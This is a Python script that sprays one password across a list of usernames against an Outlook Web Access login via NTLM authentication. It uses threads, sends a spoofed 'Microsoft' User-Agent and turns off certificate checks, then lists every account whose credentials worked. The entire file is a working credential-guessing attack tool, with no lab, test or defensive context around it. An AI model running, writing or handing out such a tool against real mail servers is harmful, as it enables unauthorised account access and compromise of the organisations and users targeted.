#!/usr/bin/env python3

"""
Usage:
    spraying.py owa <target> <password> <userfile> [--threads THREADS] [--debug]
    spraying.py -h | --help
    spraying.py -v | --version

Arguments:
    target         target domain or URL
    password       password to spray
    userfile       file containing usernames (one per line)

Options:
    -h, --help               show this screen
    -v, --version            show version
    -t, --threads THREADS    number of concurrent threads to use [default: 3]
    -d, --debug              enable debug output
"""

import logging
import asyncio
import concurrent.futures
import sys
from functools import partial
from pathlib import Path
from docopt import docopt
from requests_ntlm import HttpNtlmAuth
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

VERSION = "1.0.0"

class OWA:
    def __init__(self, target):
        self.target = target
        self.valid_accounts = []

    def auth(self, username, password):
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            logging.info(f"Attempting authentication for {username}")
            req = requests.get(self.target, auth=HttpNtlmAuth(username, password), headers={'User-Agent': 'Microsoft'}, verify=False)
            logging.info(f"Received status code {req.status_code} for {username}")
            logging.info(f"Response headers: {req.headers}")
            logging.info(f"Response text: {req.text}")
            if req.status_code == 200:
                print(f"User {username} password is {password}")
                self.valid_accounts.append((username, password))
            elif req.status_code == 401:
                print(f"Authentication failed for {username}")
            else:
                print(f"Unexpected status code {req.status_code} for {username}")
        except Exception as e:
            print(f"Exception for {username}: {e}")

class Atomizer:
    def __init__(self, loop, target, threads=3, debug=False):
        self.loop = loop
        self.target = target
        self.sprayer = OWA(target=self.target)
        self.threads = int(threads)
        self.debug = debug

        log_format = '%(threadName)10s %(name)18s: %(message)s' if debug else '%(message)s'

        logging.basicConfig(
            level=logging.DEBUG if debug else logging.INFO,
            format=log_format,
            stream=sys.stderr,
        )

        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads,
        )

    async def atomize(self, userfile, password):
        log = logging.getLogger('atomize')
        log.debug('atomizing...')

        log.debug('creating executor tasks')
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(self.sprayer.auth, username=username.strip(), password=password))
            for username in userfile
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    def print_summary(self):
        if self.sprayer.valid_accounts:
            print("\nValid Credentials Found:")
            for username, password in self.sprayer.valid_accounts:
                print(f"- {username}:{password}")
        else:
            print("\nNo valid credentials found.")

if __name__ == "__main__":
    args = docopt(__doc__, version=VERSION)
    loop = asyncio.get_event_loop()

    atomizer = Atomizer(
        loop=loop,
        target=args['<target>'].lower(),
        threads=args['--threads'],
        debug=args['--debug']
    )

    logging.debug(args)

    userfile_path = Path(args['<userfile>'])
    if not userfile_path.exists() or not userfile_path.is_file():
        logging.error("Path to <userfile> invalid!")
        sys.exit(1)

    try:
        loop.run_until_complete(
            atomizer.atomize(
                userfile=open(args['<userfile>']),
                password=args['<password>']
            )
        )
    finally:
        atomizer.print_summary()
